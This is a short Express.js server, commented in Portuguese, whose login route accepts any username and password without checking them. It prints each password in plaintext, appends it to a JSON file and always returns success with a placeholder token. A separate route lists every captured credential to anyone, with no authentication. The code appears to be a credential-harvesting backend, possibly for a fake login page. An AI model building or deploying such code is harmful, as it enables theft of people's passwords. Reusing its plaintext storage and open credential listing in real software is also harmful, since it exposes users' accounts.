const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080;

// Middlewares
app.use(cors());
app.use(express.json());

// Caminho dos arquivos públicos
const publicDir = path.join(__dirname, 'public');

// Disponibiliza index.html, erro.html, script.js e outros arquivos
app.use(express.static(publicDir));

// Página inicial
app.get('/', (req, res) => {
    res.sendFile(path.join(publicDir, 'index.html'));
});

// Página de erro/demonstração
app.get('/erro.html', (req, res) => {
    res.sendFile(path.join(publicDir, 'erro.html'));
});

// Rota POST para receber o login e salvar no usuarios.json
app.post('/api/login', (req, res) => {
    const { usuario, senha } = req.body || {};

    if (
        typeof usuario !== 'string' ||
        typeof senha !== 'string' ||
        !usuario.trim() ||
        !senha.trim()
    ) {
        return res.status(400).json({
            sucesso: false,
            mensagem: 'Preencha os campos para continuar.'
        });
    }

    console.log(`Login recebido -> Usuário: ${usuario} | Senha: ${senha}`);

    // Caminho para o arquivo JSON onde vamos guardar os dados
    const filePath = path.join(__dirname, 'usuarios.json');
    let dadosSalvos = [];

    // Se o arquivo já existir, lê o conteúdo atual
    if (fs.existsSync(filePath)) {
        try {
            const fileData = fs.readFileSync(filePath, 'utf-8');
            dadosSalvos = JSON.parse(fileData);
        } catch (error) {
            dadosSalvos = [];
        }
    }

    // Adiciona o novo login à lista (com data e hora)
    dadosSalvos.push({
        usuario,
        senha,
        dataAcesso: new Date().toISOString()
    });

    // Salva de volta no arquivo JSON
    try {
        fs.writeFileSync(filePath, JSON.stringify(dadosSalvos, null, 2));
    } catch (error) {
        console.error('Erro ao escrever no arquivo usuarios.json:', error);
    }

    return res.status(200).json({
        sucesso: true,
        mensagem: 'Login efetuado e guardado com sucesso!',
        token: 'token-jwt-exemplo-abc123xyz'
    });
});

// Rota para visualizar os logins salvos no navegador
app.get('/api/usuarios', (req, res) => {
    const filePath = path.join(__dirname, 'usuarios.json');
    if (fs.existsSync(filePath)) {
        try {
            const data = fs.readFileSync(filePath, 'utf-8');
            return res.status(200).json(JSON.parse(data));
        } catch (error) {
            return res.status(500).json({ erro: 'Erro ao ler o arquivo de usuários.' });
        }
    }
    return res.status(200).json([]);
});

// Inicialização
app.listen(PORT, () => {
    console.log(`Servidor iniciado na porta ${PORT}`);
});